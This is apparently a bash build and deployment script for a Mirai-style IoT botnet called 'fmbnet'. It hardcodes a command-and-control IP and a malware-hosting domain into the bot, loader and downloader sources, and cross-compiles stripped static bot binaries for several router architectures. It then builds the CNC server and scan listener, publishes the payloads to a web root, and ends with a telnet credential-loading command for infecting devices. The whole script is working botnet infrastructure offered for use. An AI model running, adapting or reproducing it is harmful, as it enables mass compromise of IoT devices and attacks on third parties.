#!/bin/bash

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$PROJECT_DIR"

SERVER_IP="${SERVER_IP:-195.209.219.35}"
CNC_IP="${CNC_IP:-$SERVER_IP}"
BINS_DOMAIN="${BINS_DOMAIN:-suck.tcpmalware.live}"
PROTO_KEY="${PROTO_KEY:-}"
if [ -f build.conf ]; then
	. build.conf
elif [ -f build.conf.example ]; then
	echo "[!] no build.conf, using build.conf.example"
	. build.conf.example
fi
[ -z "$PROTO_KEY" ] && PROTO_KEY=$(openssl rand -hex 32 2>/dev/null || echo "4e503132333435363738393031323334353637383930313233343536373839")
PROTO_MAGIC="${PROTO_MAGIC:-$(printf '0x%04X' $((0x4000 + RANDOM % 0x3FFF)))}"
INSTANCE_PORT="${INSTANCE_PORT:-$((13320 + RANDOM % 100))}"
SHARED_SECRET="${SHARED_SECRET:-$PROTO_KEY}"
NP_BUILD_RAND=${NP_BUILD_RAND:-$RANDOM}
PROTO_DEF='-DPROTO_KEY_HEX="'"$PROTO_KEY"'"'
PROTO_DEF="$PROTO_DEF -DSHARED_SECRET_HEX=\"$SHARED_SECRET\""
PROTO_DEF="$PROTO_DEF -DPROTO_MAGIC_BOT=$PROTO_MAGIC -DNP_INSTANCE_PORT=$INSTANCE_PORT -DNP_BUILD_RAND=$NP_BUILD_RAND"

RELEASE="$PROJECT_DIR/release"
MODE="${1:-x86}"

echo "[*] CNC_IP=$CNC_IP BINS_DOMAIN=$BINS_DOMAIN proto_magic=$PROTO_MAGIC"
echo "[*] mode=$MODE"

sed -i "s|#define CNC_IP_DEFAULT .*|#define CNC_IP_DEFAULT \"$CNC_IP\"|" bot/includes.h
sed -i "s|#define BINS_DOMAIN_DEFAULT .*|#define BINS_DOMAIN_DEFAULT \"$BINS_DOMAIN\"|" bot/includes.h
sed -i "s|#define SCANIP .*|#define SCANIP (int)inet_addr((const char*)\"$CNC_IP\")|" bot/includes.h
sed -i "s|#define SERVIP .*|#define SERVIP (int)inet_addr((const char*)\"$CNC_IP\")|" bot/includes.h

sed -i "s|#define HTTP_SERVER \".*\"|#define HTTP_SERVER \"$BINS_DOMAIN\"|" loader/src/headers/config.h
sed -i "s|#define TFTP_SERVER \".*\"|#define TFTP_SERVER \"$SERVER_IP\"|" loader/src/headers/config.h
sed -i "s|addrs\[0\] = inet_addr(\".*\");|addrs[0] = inet_addr(\"$SERVER_IP\");|" loader/src/main.c

dlr_ip=$(echo "$SERVER_IP" | tr '.' ',')
sed -i "s|#define GRPC_SERVER utils_inet_addr(.*)|#define GRPC_SERVER utils_inet_addr($dlr_ip)|" dlr/main.c

sed -i "s|net.Listen(\"tcp\", \"[^\"]*\"|net.Listen(\"tcp\", \"$CNC_IP:34130\"|" scanListen.go

if [ -f cnc/proto.go ]; then
	sed -i "s/const ProtoMagicBot = 0x[0-9A-Fa-f]*/const ProtoMagicBot = $PROTO_MAGIC/" cnc/proto.go
fi

if [ -f cnc/config.json ]; then
	sed -i "s|\"cnc_listen\":\"[^\"]*\"|\"cnc_listen\":\"$SERVER_IP:34129\"|" cnc/config.json
	sed -i "s|\"admin_listen\":\"[^\"]*\"|\"admin_listen\":\"$SERVER_IP:34131\"|" cnc/config.json
	sed -i "s|\"scan_listen\":\"[^\"]*\"|\"scan_listen\":\"$SERVER_IP:34130\"|" cnc/config.json
	sed -i "s|\"http_server\":\"[^\"]*\"|\"http_server\":\"$SERVER_IP\"|" cnc/config.json
	sed -i "s|\"tftp_server\":\"[^\"]*\"|\"tftp_server\":\"$SERVER_IP\"|" cnc/config.json
	sed -i "s|\"proto_key\":\"[^\"]*\"|\"proto_key\":\"$PROTO_KEY\"|" cnc/config.json
fi

mkdir -p "$RELEASE"

compile_x86() {
	echo "[*] compiling fmbnet.x86"
	local files
	files=($(ls bot/*.c | shuf 2>/dev/null || ls bot/*.c))
	gcc -std=c99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
		-w -Os ${files[@]} -o "$RELEASE/fmbnet.x86" -lpthread -ldl -Wl,--gc-sections
	strip -s -x "$RELEASE/fmbnet.x86" 2>/dev/null || strip "$RELEASE/fmbnet.x86" -S --strip-unneeded 2>/dev/null || true
}

compile_multi() {
	local specs=(
		"i686-linux-gnu:fmbnet.x86:x86:X32"
		"mips-linux-gnu:fmbnet.mips:mips:MIPS"
		"mipsel-linux-gnu:fmbnet.mpsl:mpsl:MIPSEL"
		"arm-linux-gnueabi:fmbnet.arm:arm:ARM"
		"arm-linux-gnueabihf:fmbnet.arm7:arm7:ARM"
		"powerpc-linux-gnu:fmbnet.ppc:ppc:PPC"
	)
	for spec in "${specs[@]}"; do
		prefix="${spec%%:*}"
		rest="${spec#*:}"
		out="${rest%%:*}"
		rest="${rest#*:}"
		arch="${rest%%:*}"
		def="${rest##*:}"
		if command -v ${prefix}-gcc &>/dev/null; then
			echo "[*] compiling $out"
			local files
			files=($(ls bot/*.c | shuf 2>/dev/null || ls bot/*.c))
			${prefix}-gcc -std=c99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
				-w -Os ${files[@]} -o "$RELEASE/$out" -Dfmbnet_BOT_ARCH=\"$arch\" -lpthread -ldl -Wl,--gc-sections
			${prefix}-strip -s -x "$RELEASE/$out" 2>/dev/null || ${prefix}-strip "$RELEASE/$out" -S --strip-unneeded 2>/dev/null || true
		else
			echo "[!] skip $out (${prefix}-gcc not found)"
		fi
	done
}

if [ "$MODE" = "multi" ]; then
	compile_multi
else
	compile_x86
fi

mkdir -p dlr/release
dlr_specs=(
	"i686-linux-gnu:x86:X32"
	"mips-linux-gnu:mips:MIPS"
	"mipsel-linux-gnu:mpsl:MIPSEL"
	"arm-linux-gnueabi:arm:ARM"
	"arm-linux-gnueabihf:arm7:ARM"
	"powerpc-linux-gnu:ppc:PPC"
)
for spec in "${dlr_specs[@]}"; do
	prefix="${spec%%:*}"
	rest="${spec#*:}"
	arch="${rest%%:*}"
	def="${rest##*:}"
	if [ "$MODE" = "x86" ] && [ "$arch" != "x86" ]; then continue; fi
	if command -v ${prefix}-gcc &>/dev/null; then
		echo "[*] compiling dlr.$arch"
		${prefix}-gcc -Os -D BOT_ARCH=\"$arch\" -D $def -Wl,--gc-sections \
			-fdata-sections -ffunction-sections -e __start -nostartfiles -static \
			dlr/main.c -o dlr/release/dlr.$arch 2>/dev/null || true
	fi
done
if [ "$MODE" = "x86" ]; then
	echo "[*] compiling dlr.x86"
	gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections \
		-e __start -nostartfiles -static dlr/main.c -o dlr/release/dlr.x86 2>/dev/null || true
fi

echo "[*] building cnc"
cp cnc/config.json "$RELEASE/" 2>/dev/null || cp config.json "$RELEASE/" 2>/dev/null || true
if [ ! -f "$PROJECT_DIR/go.mod" ]; then
	echo "[!] go.mod not found in $PROJECT_DIR, run script from project root"
	exit 1
fi
cd "$PROJECT_DIR" && go mod download && go build -o "$RELEASE/cnc" ./cnc/...
echo "[*] building scanListen"
go build -o "$RELEASE/scanListen" ./scanListen.go

echo "[*] building loader"
gcc -static -O3 -lpthread -pthread loader/src/*.c -o "$RELEASE/loader"

LOADER_BINS="$RELEASE/loader_bins"
mkdir -p "$LOADER_BINS/bins"
cp dlr/release/dlr.* "$LOADER_BINS/bins/" 2>/dev/null || true
cp "$RELEASE/loader" "$LOADER_BINS/"

echo "[*] deploying to /var/www/html/bins and /opt/fmbnet"
sudo mkdir -p /var/www/html/bins
sudo cp "$RELEASE"/fmbnet.* /var/www/html/bins/ 2>/dev/null || true
sudo cp "$LOADER_BINS"/bins/dlr.* /var/www/html/bins/ 2>/dev/null || true
sudo mkdir -p /opt/fmbnet
sudo cp "$RELEASE/cnc" /opt/fmbnet/
sudo cp "$RELEASE/config.json" /opt/fmbnet/ 2>/dev/null || true
echo "[*] done. loader: cd $LOADER_BINS && echo 'ip:23 user:pass arm7' | ./loader"
